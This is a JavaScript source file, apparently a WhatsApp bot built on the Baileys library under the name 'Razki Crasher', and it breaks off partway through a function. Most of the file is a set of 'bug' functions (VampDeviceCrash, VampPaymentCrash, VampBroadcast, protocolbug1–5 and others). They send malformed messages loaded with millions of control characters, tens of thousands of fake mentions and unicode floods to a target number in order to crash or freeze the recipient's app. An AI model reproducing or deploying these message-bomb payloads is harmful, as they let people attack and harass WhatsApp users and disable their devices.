//========RAZKI========//
require('./config')
const { 
default: baileys, 
proto, 
getContentType, 
generateWAMessage, 
generateWAMessageFromContent, 
generateWAMessageContent,
prepareWAMessageMedia, 
downloadContentFromMessage
} = require("@whiskeysockets/baileys");
const fs = require('fs-extra')
const util = require('util')
const chalk = require('chalk')
const { addPremiumUser, delPremiumUser } = require("./lib/premiun");
const { getBuffer, getGroupAdmins, getSizeMedia, fetchJson, sleep, isUrl, runtime } = require('./lib/myfunction');
//===============
module.exports = rikz = async (rikz, m, chatUpdate, store) => {
try {
const body = (
m.mtype === "conversation" ? m.message.conversation :
m.mtype === "imageMessage" ? m.message.imageMessage.caption :
m.mtype === "videoMessage" ? m.message.videoMessage.caption :
m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
m.mtype === "interactiveResponseMessage" ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id :
m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
m.mtype === "messageContextInfo" ?
m.message.buttonsResponseMessage?.selectedButtonId ||
m.message.listResponseMessage?.singleSelectReply.selectedRowId ||
m.message.InteractiveResponseMessage.NativeFlowResponseMessage ||
m.text : "");
const prefix = (typeof body === "string" ? global.prefix.find(p => body.startsWith(p)) : null) || "";  
const isCmd = !!prefix;  
const args = isCmd ? body.slice(prefix.length).trim().split(/ +/).slice(1) : []; 
const command = isCmd ? body.slice(prefix.length).trim().split(/ +/)[0].toLowerCase() : "";
const text = q = args.join(" ")//hard
const fatkuns = m.quoted || m;
const quoted = ["buttonsMessage", "templateMessage", "product"].includes(fatkuns.mtype)
? fatkuns[Object.keys(fatkuns)[1] || Object.keys(fatkuns)[0]]
: fatkuns;
//======================
const botNumber = await rikz.decodeJid(rikz.user.id);
const premuser = JSON.parse(fs.readFileSync("./system/database/premium.json"));
const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(m.sender);
const isPremium = [botNumber, ...global.owner, ...premuser.map(user => user.id.replace(/[^0-9]/g, "") + "@s.whatsapp.net")].includes(m.sender);
if (!rikz.public && !isCreator) return;
//======================
const isGroup = m.chat.endsWith("@g.us");
const groupMetadata = isGroup ? await rikz.groupMetadata(m.chat).catch(() => ({})) : {};
const participants = groupMetadata.participants || [];
const groupAdmins = participants.filter(v => v.admin).map(v => v.id);
const isBotAdmins = groupAdmins.includes(botNumber);
const isAdmins = groupAdmins.includes(m.sender);
const groupName = groupMetadata.subject || "";
//======================
if (m.message) {
rikz.readMessages([m.key]);
console.log("┏━━━━━━━━━━━━━━━━━━━━━━━=");
console.log(`┃¤ ${chalk.hex("#FFD700").bold("📩 NEW MESSAGE")} ${chalk.hex("#00FFFF").bold(`[${new Date().toLocaleTimeString()}]`)} `);
console.log(`┃¤ ${chalk.hex("#FF69B4")("💌 Dari:")} ${chalk.hex("#FFFFFF")(`${m.pushName} (${m.sender})`)} `);
console.log(`┃¤ ${chalk.hex("#FFA500")("📍 Di:")} ${chalk.hex("#FFFFFF")(`${groupName || "Private Chat"}`)} `);
console.log(`┃¤ ${chalk.hex("#00FF00")("📝 Pesan:")} ${chalk.hex("#FFFFFF")(`${body || m?.mtype || "Unknown"}`)} `);
console.log("┗━━━━━━━━━━━━━━━━━━━━━━━=")}
//FUNCTION BUG
async function VampSpam(langgxyz, target) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: target,
              },
            },
            body: {
              text: "Razki Crasher🐍 🐍 Here",
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
              ],
            },
          },
        },
      },
    };

    await rikz.relayMessage(target, message, {
      participant: { jid: target },
    });
  } catch (err) {
    console.log(err);
  }
}
async function VampDeviceCrash(langgxyz, target) {
    await rikz.relayMessage(number, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "Hi...I'm Razki Crasher 🐍",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\u0000".repeat(1000000),
                        version: 3
                    }
                }
            }
        }
    }, { participant: { jid: target}});
}

async function VampPaymentCrash(target, Ptcp = true) {
    await rikz.relayMessage(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "Razki.biz.net",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "payment_transaction_request",
                        paramsJson: "\u0003".repeat(1000000),
                        version: 3
                    }
                }
            }
        }
    }, { participant: { jid: target }});
}

async function VampDelayMess(langgxyz, target) {
    const message = {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                            mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                            fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                            fileLength: "9999999999999",
                            pageCount: 1316134911,
                            mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                            fileName: "xnxxx.com",
                            fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                            directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1726867151",
                            contactVcard: true,
                            jpegThumbnail: ""
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "Razki Crasher 🐍 🐍 Is Here\n" + "@062598121203".repeat(17000)
                    },
                    nativeFlowMessage: {
                        buttons: [{
                            name: "cta_url",
                            buttonParamsJson: "{ display_text: 'Flixce Strom 🐍 🐍 Bot', url: \"https://youtube.com/@iqbhalkeifer25\", merchant_url: \"https://youtube.com/@iqbhalkeifer25\" }"
                        }, {
                            name: "call_permission_request",
                            buttonParamsJson: "{}"
                        }],
                        messageParamsJson: "{}"
                    },
                    contextInfo: {
                        mentionedJid: ["15056662003@s.whatsapp.net", ...Array.from({
                            length: 30000
                        }, () => "1" + Math.floor(Math.random() * 700000) + "@s.whatsapp.net")],
                        forwardingScore: 1,
                        isForwarded: true,
                        fromMe: false,
                        participant: "0@s.whatsapp.net",
                        remoteJid: "status@broadcast",
                        quotedMessage: {
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                                fileLength: "9999999999999",
                                pageCount: 1316134911,
                                mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                                fileName: "xvideos.com",
                                fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                                directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1724474503",
                                contactVcard: true,
                                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                                jpegThumbnail: ""
                            }
                        }
                    }
                }
            }
        }
    };

    await rikz.relayMessage(target, message, {
        participant: { jid: target }
    });
}

async function VampPrivateBlank(langgxyz, target) {
  const Vampire = `_*~@2~*_\n`.repeat(10500);
  const Private = 'ꦽ'.repeat(5000);

  const message = {
    ephemeralMessage: {
      message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
              fileLength: "9999999999999",
              pageCount: 1316134911,
              mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
              fileName: "Pembasmi Kontol",
              fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
              directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1726867151",
              contactVcard: true,
              jpegThumbnail: null,
            },
            hasMediaAttachment: true,
          },
          body: {
            text: 'Razki Crasher 🐍 🐍 Blank!' + Vampire + Private,
          },
          footer: {
            text: '',
          },
          contextInfo: {
            mentionedJid: [
              "15056662003@s.whatsapp.net",
              ...Array.from(
                { length: 30000 },
                () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            forwardingScore: 1,
            isForwarded: true,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            quotedMessage: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                fileName: "bokep.com",
                fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1724474503",
                contactVcard: true,
                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                jpegThumbnail: "",
              },
            },
          },
        },
      },
    },
  };

  await rikz.relayMessage(target, message, { participant: { jid: target } });
}

async function VampDelayCrash(langgxyz, target) {
    const Vampire = "_*~@15056662003~*_\n".repeat(10200);
    const Lalapo = "ꦽ".repeat(1500);

    const message = {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                            mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                            fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                            fileLength: "9999999999999",
                            pageCount: 1316134911,
                            mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                            fileName: "𝐀𝐧𝐚𝐤 𝐇𝐚𝐬𝐢𝐥 𝐋𝐨𝐧𝐭𝐞",
                            fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                            directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1726867151",
                            contactVcard: true,
                            jpegThumbnail: ""
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "Razki Crasher 🐍 🐍 Bug" + Lalapo + Vampire
                    },
                    contextInfo: {
                        mentionedJid: ["15056662003@s.whatsapp.net", ...Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
                        forwardingScore: 1,
                        isForwarded: true,
                        fromMe: false,
                        participant: "0@s.whatsapp.net",
                        remoteJid: "status@broadcast",
                        quotedMessage: {
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                                fileLength: "9999999999999",
                                pageCount: 1316134911,
                                mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                                fileName: "https://xnxxx.com",
                                fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                                directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1724474503",
                                contactVcard: true,
                                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                                jpegThumbnail: ""
                            }
                        }
                    }
                }
            }
        }
    };

    await rikz.relayMessage(target, message, { participant: { jid: target } });
}

async function VampBroadcast(langgxyz, target, mention = true) { // Default true biar otomatis nyala
    const delaymention = Array.from({ length: 30000 }, (_, r) => ({
        title: "᭡꧈".repeat(95000),
        rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
    }));

    const MSG = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "Razki Crasher 🐍 🐍 Here",
                    listType: 2,
                    buttonText: null,
                    sections: delaymention,
                    singleSelectReply: { selectedRowId: "🔴" },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => 
                            "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                        ),
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "333333333333@newsletter",
                            serverMessageId: 1,
                            newsletterName: "-"
                        }
                    },
                    description: "Dont Bothering Me Bro!!!"
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    };

    const msg = generateWAMessageFromContent(target, MSG, {});

    await rikz.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    // **Cek apakah mention true sebelum menjalankan relayMessage**
    if (mention) {
        await rikz.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "Razki Crasher 🐍 🐍 Here Bro" },
                        content: undefined
                    }
                ]
            }
        );
    }
}


        // Func Protocol 
async function protocolbug1(isTarget, mention) {
const delaymention = Array.from({ length: 9741 }, (_, r) => ({
title: "᭯".repeat(9741),
rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
}));

const MSG = {
viewOnceMessage: {
message: {
listResponseMessage: {
title: "Ciee Kena Bug ya??",
listType: 2,
buttonText: null,
sections: delaymention,
singleSelectReply: { selectedRowId: "🌀" },
contextInfo: {
mentionedJid: Array.from({ length: 9741 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
participant: isTarget,
remoteJid: "status@broadcast",
forwardingScore: 9741,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: "9741@newsletter",
serverMessageId: 1,
newsletterName: "-"
}
},
description: "( Script Razki Crasher V2 )"
}
}
},
contextInfo: {
channelMessage: true,
statusAttributionType: 2
}
};

const msg = generateWAMessageFromContent(isTarget, MSG, {});

await rikz.relayMessage("status@broadcast", msg.message, {
messageId: msg.key.id,
statusJidList: [isTarget],
additionalNodes: [
{
tag: "meta",
attrs: {},
content: [
{
tag: "mentioned_users",
attrs: {},
content: [
{
tag: "to",
attrs: { jid: isTarget },
content: undefined
}
]
}
]
}
]
});

if (mention) {
await rikz.relayMessage(
isTarget,
{
statusMentionMessage: {
message: {
protocolMessage: {
key: msg.key,
type: 25
}
}
}
},
{
additionalNodes: [
{
tag: "meta",
attrs: { is_status_mention: "🌀 *Athena* - 𝗧𝗿𝗮𝘀𝗵 𝗣𝗿𝗼𝘁𝗼𝗰𝗼𝗹" },
content: undefined
}
]
}
);
}
}

async function protocolbug2(isTarget, mention) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    caption: "? ???????-?",
                    fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                    fileLength: "19769",
                    height: 354,
                    width: 783,
                    mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                    fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                    directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                    mediaKeyTimestamp: "1743225419",
                    jpegThumbnail: null,
                    scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                    scanLengths: [2437, 17332],
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: isTarget,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(isTarget, generateMessage, {});

    await rikz.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: isTarget },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await rikz.relayMessage(
            isTarget,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "???? ???????? - ????" },
                        content: undefined
                    }
                ]
            }
        );
    }
}

async function protocolbug3(target, mention) {
    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                videoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
                    mimetype: "video/mp4",
                    fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
                    fileLength: "999999",
                    seconds: 999999,
                    mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
                    caption: "\u9999",
                    height: 999999,
                    width: 999999,
                    fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
                    directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1743742853",
                    contextInfo: {
                        isSampled: true,
                        mentionedJid: [
                            "13135550002@s.whatsapp.net",
                            ...Array.from({ length: 30000 }, () =>
                                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                            )
                        ]
                    },
                    streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
                    thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
                    thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
                    thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
                    annotations: [
                        {
                            embeddedContent: {
                                embeddedMusic: {
                                    musicContentMediaId: "kontol",
                                    songId: "peler",
                                    author: "\u9999",
                                    title: "\u9999",
                                    artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                    artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
                                    countryBlocklist: true,
                                    isExplicit: true,
                                    artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                                }
                            },
                            embeddedAction: null
                        }
                    ]
                }
            }
        }
    }, {});

    await rikz.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await rikz.relayMessage(target, {
            groupStatusMentionMessage: {
                message: { protocolMessage: { key: msg.key, type: 25 } }
            }
        }, {
            additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }]
        });
    }
  }
    
    async function protocolbug4(isTarget, mention) {
    const glitchText = "𓆩⛧𓆪".repeat(3000) + "\n" + "‎".repeat(3000); // simbol + invisible
    
    const generateMessage = {
        viewOnceMessage: {
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    caption: `╔═━━━✥◈✥━━━═╗\n  Razki Crasher - Is Heree🐍\n╚═━━━✥◈✥━━━═╝\n${glitchText}`,
                    fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                    fileLength: "19769",
                    height: 354,
                    width: 783,
                    mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                    fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                    directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                    mediaKeyTimestamp: "1743225419",
                    jpegThumbnail: null,
                    scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                    scanLengths: [2437, 17332],
                    contextInfo: {
                        mentionedJid: Array.from({ length: 40000 }, () => "1" + Math.floor(Math.random() * 999999) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: isTarget,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9999,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(isTarget, generateMessage, {});

    await rikz.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: isTarget },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await rikz.relayMessage(
            isTarget,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "⚠️ SAHRIL VIEWONCE BUG V4" },
                        content: undefined
                    }
                ]
            }
        );
    }
}

  async function protocolbug5v2(isTarget, mention) {
    const maxMention = 65000; // mendekati batas JS maksimal
    const mentionedList = Array.from({ length: maxMention }, (_, i) =>
        `1${Math.floor(100000 + Math.random() * 900000)}@s.whatsapp.net`
    );

    const longUnicode = "៛" + "‌‎‏" + " ".repeat(500) + "៛".repeat(20000);

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: ".CikssXyz || Beginner" + longUnicode,
        title: "RazkiCrasher🐉〽️" + longUnicode,
        artworkDirectPath: "/v/t62.76458-24/...",
        artworkSha256: "fakehash==",
        artworkEncSha256: "fakehashenc==",
        artistAttribution: "https://instagram.com/_u/tamainfinity_",
        countryBlocklist: false,
        isExplicit: true,
        artworkMediaKey: "fakekey=="
    };

    const annotations = Array.from({ length: 5 }, () => ({
        embeddedContent: { embeddedMusic },
        embeddedAction: true
    }));

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/...",
        mimetype: "video/mp4",
        fileSha256: "fakebase64==",
        fileLength: "999999",
        seconds: 30,
        mediaKey: "fakeMediaKey==",
        caption: "𐌕𐌀𐌌𐌀 RTL\u202eBUG\u202c𐍂𐍉𐍂" + longUnicode,
        height: 720,
        width: 1280,
        fileEncSha256: "fakeenc==",
        directPath: "/v/t62.7161-24/...",
        mediaKeyTimestamp: `${Date.now()}`,
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "༿༑ᜳ𝗥͢𝗬𝗨͜𝗜̸𝗖͠𝗛̭𝗜̬ᢶ⃟"
        },
        streamingSidecar: "fakeSidecar==",
        thumbnailDirectPath: "/v/t62.36147-24/...",
        thumbnailSha256: "fakehash==",
        thumbnailEncSha256: "fakeenc==",
        annotations
    };

    const msg = generateWAMessageFromContent(isTarget, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});

